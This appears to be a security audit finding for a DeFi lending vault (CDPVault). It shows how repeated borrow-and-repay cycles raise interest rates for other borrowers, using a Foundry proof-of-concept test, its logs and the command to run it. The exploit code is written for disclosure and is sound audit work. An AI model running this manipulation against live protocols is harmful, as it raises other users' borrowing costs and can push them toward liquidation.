## [H] Malicious borrower cycle exploits to inflate interest rates

<relative_path_091409:src/CDPVault.sol#L256>

<relative_path_091409:src/CDPVault.sol#L272>

### Impact

The current implementation allows a malicious actor to artificially inflate interest rates for all borrowers in the system through rapid borrow-and-repay cycles. This exploit can lead to:

1. Increased costs for legitimate borrowers who may face higher interest rates than expected.
2. Potential forced liquidations of other borrowers if interest rates rise rapidly enough to push their positions into unsafe territory.
3. Unfair advantage for the attacker if they are also a lender in the system, as they could increase returns on their deposits.

This vulnerability undermines the fairness and stability of the lending platform, potentially leading to loss of funds for users.

### Proof of Concept

The following test demonstrates the attack by comparing interest accrual with and without the borrow-repay cycles, please add this test function to `CDPVault.t.sol` test file:

```solidity
function test_borrow_repay_cycles_with_attack() public {
  compare_interest_accrual_with_borrow_repay_cycles(true);
}
function test_borrow_repay_cycles_without_attack() public {
  compare_interest_accrual_with_borrow_repay_cycles(false);
}


//    A cycle borrower can increase the interest rate on other borrowers. by borrow and repay.
function compare_interest_accrual_with_borrow_repay_cycles(bool attack) internal {


  console.log(attack?"Cycle borrower is attacking":"Cycle borrower is NOT attacking");


  CDPVault vault = createCDPVault(token, 1000 ether, 0, 1.25 ether, 1.0 ether, 0);
  createGaugeAndSetGauge(address(vault));

  // Setup two borrowers
  address normalBorrower = address(0x1);
  address cycleBorrower = address(0x2);
  address normalBorrower2 = address(0x3);

  // Deposit more collateral to ensure safe ratios
  uint256 collateralAmount = 200 ether;
  token.mint(normalBorrower, collateralAmount);
  vm.prank(normalBorrower);
  token.approve(address(vault), collateralAmount);
  vm.prank(normalBorrower);
  vault.deposit(normalBorrower, collateralAmount);


  token.mint(normalBorrower2, collateralAmount);
  vm.prank(normalBorrower2);
  token.approve(address(vault), collateralAmount);
  vm.prank(normalBorrower2);
  vault.deposit(normalBorrower2, collateralAmount);


  {
  token.mint(cycleBorrower, collateralAmount);
  console.log("Cycle borrower Balance Before:", token.balanceOf(cycleBorrower));
  }
  vm.prank(cycleBorrower);
  token.approve(address(vault), collateralAmount);
  vm.prank(cycleBorrower);
  vault.deposit(cycleBorrower, collateralAmount);



  // Both borrowers take out initial loans
  uint256 borrowAmount = 50 ether;
  vm.prank(normalBorrower);
  vault.modifyCollateralAndDebt(normalBorrower, normalBorrower, normalBorrower, 0, int256(borrowAmount));
  vm.prank(normalBorrower2);
  vault.modifyCollateralAndDebt(normalBorrower2, normalBorrower2, normalBorrower2, 0, int256(borrowAmount));

  // Record initial state
  uint256 initialDebtNormal = vault.virtualDebt(normalBorrower);
  uint256 initialDebtNormal2 = vault.virtualDebt(normalBorrower2);
  uint256 initialDebtCycle = vault.virtualDebt(cycleBorrower);

  console.log("Initial state:");
  logPoolState(vault);

  // Simulate passage of time and borrow-repay cycles
  uint256 cycles = 10;
  uint256 timeBetweenCycles = 1 hours;

  // Mint a large amount of WETH to this contract to cover all potential debts
  mockWETH.mint(address(this), 1000 ether);
{

  for (uint256 i = 0; i < cycles; i++) {
      if(attack){
      vm.startPrank(cycleBorrower);

      vault.modifyCollateralAndDebt(cycleBorrower, cycleBorrower, cycleBorrower, 0, int256(borrowAmount));

      // Repay all debt
      uint256 currentDebt = vault.virtualDebt(cycleBorrower);

      if (currentDebt > 0) {
          mockWETH.transfer(cycleBorrower, currentDebt);
          mockWETH.approve(address(vault), currentDebt);
          vault.modifyCollateralAndDebt(cycleBorrower, cycleBorrower, cycleBorrower, 0, -int256(currentDebt));
      }

      console.log("Borrow and repay Cycle: #", i+1);

      vm.stopPrank();

      }
      // Advance time
      vm.warp(block.timestamp + timeBetweenCycles);
  }
}
  vm.startPrank(cycleBorrower);
  vault.withdraw(cycleBorrower, collateralAmount);
  vm.stopPrank();


  // Check final debts
  uint256 finalDebtNormal = vault.virtualDebt(normalBorrower);
  uint256 finalDebtNormal2 = vault.virtualDebt(normalBorrower2);

  // Calculate accrued interest
  console.log("Debts ======");

  console.log("initialDebtNormal:", initialDebtNormal);
  console.log("finalDebtNormal:", finalDebtNormal);
  console.log("initialDebtNormal2:", initialDebtNormal2);
  console.log("finalDebtNormal2:", finalDebtNormal2);


  uint256 accruedInterestNormal = finalDebtNormal - initialDebtNormal;
  uint256 accruedInterestNormal2 = finalDebtNormal2 - initialDebtNormal2;


  // Calculate accrued interest
  console.log("\n Accrued interest ======");
  console.log("Normal borrower initial debt:", initialDebtNormal);
  console.log("Normal borrower final debt:", finalDebtNormal);
  console.log("Normal borrower accrued interest:", accruedInterestNormal);

  console.log("Normal borrower 2 initial debt:", initialDebtNormal2);
  console.log("Normal borrower 2 final debt:", finalDebtNormal2);
  console.log("Normal borrower 2 accrued interest:", accruedInterestNormal2);
  console.log("======");

  logPoolState(vault);


  logBalance(cycleBorrower);

}

function logBalance(address addr) internal view {
  console.log("Cycle borrower Balance After:", token.balanceOf(addr));
}


function logPoolState(CDPVault vault) internal view {
  address poolAddress = address(vault.pool());
  console.log("  Total Debt:", vault.totalDebt());
  console.log("  Expected Liquidity:", IPoolV3(poolAddress).expectedLiquidity());
  console.log("  Available Liquidity:", IPoolV3(poolAddress).availableLiquidity());
  console.log("  Utilization:", calculateUtilization(
      IPoolV3(poolAddress).expectedLiquidity(),
      IPoolV3(poolAddress).availableLiquidity()
  ));
  console.log("  Base Interest Rate:", IPoolV3(poolAddress).baseInterestRate());
}

function calculateUtilization(uint256 expectedLiquidity, uint256 availableLiquidity) internal pure returns (uint256) {
  if (expectedLiquidity == 0) return 0;
  return ((expectedLiquidity - availableLiquidity) * 10000) / expectedLiquidity;
}
```



**Results from the test output:**

1. With attack:
    - Normal borrower accrued interest: `5766476609207981`
    - Base Interest Rate after cycles: `100023531853668664470588235`

2. Without attack:
    - Normal borrower accrued interest: `5766183185603008`
    - Base Interest Rate after cycles: `100023529411764705882352941`

The attack results in higher accrued interest for normal borrowers and an increased base interest rate, despite the total debt remaining the same.

**The output:**

```
[PASS] test_borrow_repay_cycles_with_attack() (gas: 5103632)
Logs:
  Cycle borrower is attacking
  Cycle borrower Balance Before: 200000000000000000000
  Initial state:
    Total Debt: 100000000000000000000
    Expected Liquidity: 1000000000000000000000000
    Available Liquidity: 999900000000000000000000
    Utilization: 1
    Base Interest Rate: 100023529411764705882352941
  Borrow and repay Cycle: # 1
  Borrow and repay Cycle: # 2
  Borrow and repay Cycle: # 3
  Borrow and repay Cycle: # 4
  Borrow and repay Cycle: # 5
  Borrow and repay Cycle: # 6
  Borrow and repay Cycle: # 7
  Borrow and repay Cycle: # 8
  Borrow and repay Cycle: # 9
  Borrow and repay Cycle: # 10
  Debts ======
  initialDebtNormal: 50000000000000000000
  finalDebtNormal: 50005766476609207981
  initialDebtNormal2: 50000000000000000000
  finalDebtNormal2: 50005766476609207981

 Accrued interest ======
  Normal borrower initial debt: 50000000000000000000
  Normal borrower final debt: 50005766476609207981
  Normal borrower accrued interest: 5766476609207981
  Normal borrower 2 initial debt: 50000000000000000000
  Normal borrower 2 final debt: 50005766476609207981
  Normal borrower 2 accrued interest: 5766476609207981
  ======
    Total Debt: 100000000000000000000
    Expected Liquidity: 1000000011532366510584090
    Available Liquidity: 999900000000000000000000
    Utilization: 1
    Base Interest Rate: 100023531853668664470588235
  Cycle borrower Balance After: 200000000000000000000

[PASS] test_borrow_repay_cycles_without_attack() (gas: 4077140)
Logs:
  Cycle borrower is NOT attacking
  Cycle borrower Balance Before: 200000000000000000000
  Initial state:
    Total Debt: 100000000000000000000
    Expected Liquidity: 1000000000000000000000000
    Available Liquidity: 999900000000000000000000
    Utilization: 1
    Base Interest Rate: 100023529411764705882352941
  Debts ======
  initialDebtNormal: 50000000000000000000
  finalDebtNormal: 50005766183185603008
  initialDebtNormal2: 50000000000000000000
  finalDebtNormal2: 50005766183185603008

 Accrued interest ======
  Normal borrower initial debt: 50000000000000000000
  Normal borrower final debt: 50005766183185603008
  Normal borrower accrued interest: 5766183185603008
  Normal borrower 2 initial debt: 50000000000000000000
  Normal borrower 2 final debt: 50005766183185603008
  Normal borrower 2 accrued interest: 5766183185603008
  ======
    Total Debt: 100000000000000000000
    Expected Liquidity: 1000000011532366371206016
    Available Liquidity: 999900000000000000000000
    Utilization: 1
    Base Interest Rate: 100023529411764705882352941
  Cycle borrower Balance After: 200000000000000000000
```

To run the test:

```sh
forge test --match-test "test_borrow_repay_cycles" -vv
```



